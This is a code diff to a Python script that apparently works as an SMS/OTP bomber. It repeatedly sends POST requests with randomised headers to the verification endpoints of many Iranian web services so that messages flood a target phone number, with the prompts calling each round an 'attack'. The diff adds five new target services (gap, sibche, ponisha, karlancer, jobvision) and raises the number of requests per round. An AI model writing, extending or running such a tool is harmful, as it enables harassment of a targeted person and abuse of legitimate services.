@@ -18,7 +18,7 @@ cyan = "\033[36m"
 purple = "\033[35m"
 #########################
 
-from date import number, url_divar, json_divar, url_snapp, json_snapp, url_sheypoor, json_sheypoor, url_jet, json_jet, url_virgool, json_virgool, url_snapp_box, json_snapp_box, url_banimode, json_banimode, url_ostadkr, json_ostadkr, url_drnext, json_drnext, url_basalam, json_basalam, url_buskool, json_buskool, url_jabama, json_jabama, url_alibaba, json_alibaba, url_digitoon, json_digitoon, url_sibapp, json_sibapp, url_Drdr, json_Drdr, url_kukala, json_kukala, url_tapsi, json_tapsi, url_flightio, json_flightio, url_football_360, json_football_360, url_miare, json_miare, url_pinket, json_pinket, heads, url_torob, url_cafebazaar, json_cafebazaar
+from date import number, url_divar, json_divar, url_snapp, json_snapp, url_sheypoor, json_sheypoor, url_jet, json_jet, url_virgool, json_virgool, url_snapp_box, json_snapp_box, url_banimode, json_banimode, url_ostadkr, json_ostadkr, url_drnext, json_drnext, url_basalam, json_basalam, url_buskool, json_buskool, url_jabama, json_jabama, url_alibaba, json_alibaba, url_digitoon, json_digitoon, url_sibapp, json_sibapp, url_Drdr, json_Drdr, url_kukala, json_kukala, url_tapsi, json_tapsi, url_flightio, json_flightio, url_football_360, json_football_360, url_miare, json_miare, url_pinket, json_pinket, heads, url_torob, url_cafebazaar, json_cafebazaar , url_gap , url_sibche , json_sibche, url_ponisha, json_ponisha, url_karlancer, json_karlancer, url_jobvision
 
 attack_speed = float(input(("" + cyan + "[" + Red + "Enter The " + Blue + "refresh rate of attacks" + cyan + "]─[" + Red + "in seconds :" + cyan + "]" + Reset)))
 
@@ -35,7 +35,7 @@ from date import url_divar, json_divar, url_snapp, json_snapp, url_sheypoor, jso
 #pbar = tqdm(total=number_t, desc="Sending requests", bar_format="{desc}: {n_fmt}/{total_fmt} [{bar}] {percentage:3.0f}% | {elapsed}<{remaining}")
 
 i = 0
-ALl_r = 25
+ALl_r = 30
 
 while i < refresh:
     pbar = tqdm(total=ALl_r, desc="Sending requests 🚀🚀🚀 :", bar_format="{desc}: {percentage:3.0f}% |{bar}| 🚀 {n_fmt}/{total_fmt} requests sent")
@@ -166,6 +166,39 @@ while i < refresh:
     time.sleep(sleep_time)
     pbar.update(1)
     pbar.set_postfix({"Request sent": i+1})
+
+    req_gap = requests.post(url=url_gap,headers=random_head)
+    time.sleep(sleep_time)
+    pbar.update(1)
+    pbar.set_postfix({"Request sent": i+1})
+
+    req_sibche = requests.post(url=url_sibche,json=json_sibche,headers=random_head)
+    time.sleep(sleep_time)
+    pbar.update(1)
+    pbar.set_postfix({"Request sent": i+1})
+
+    req_ponisha = requests.post(url=url_ponisha,json=json_ponisha,headers=random_head)
+    time.sleep(sleep_time)
+    pbar.update(1)
+    pbar.set_postfix({"Request sent": i+1})
+
+    req_karlancer = requests.post(url=url_karlancer,json=json_karlancer,headers=random_head)
+    time.sleep(sleep_time)
+    pbar.update(1)
+    pbar.set_postfix({"Request sent": i+1})
+
+    req_jobvision = requests.post(url=url_jobvision,headers=random_head)
+    time.sleep(sleep_time)
+    pbar.update(1)
+    pbar.set_postfix({"Request sent": i+1})
+
+
+
+
+
+
+
+
 
     i += 1
     print("" + cyan + "[" + Red + "Number" + cyan + "]─[" + Blue + "of" + cyan + "]─[" + Green + "repetitions :" + cyan + "]" + Red + ": " + cyan + "[" + Green + str(i) + cyan + "]")
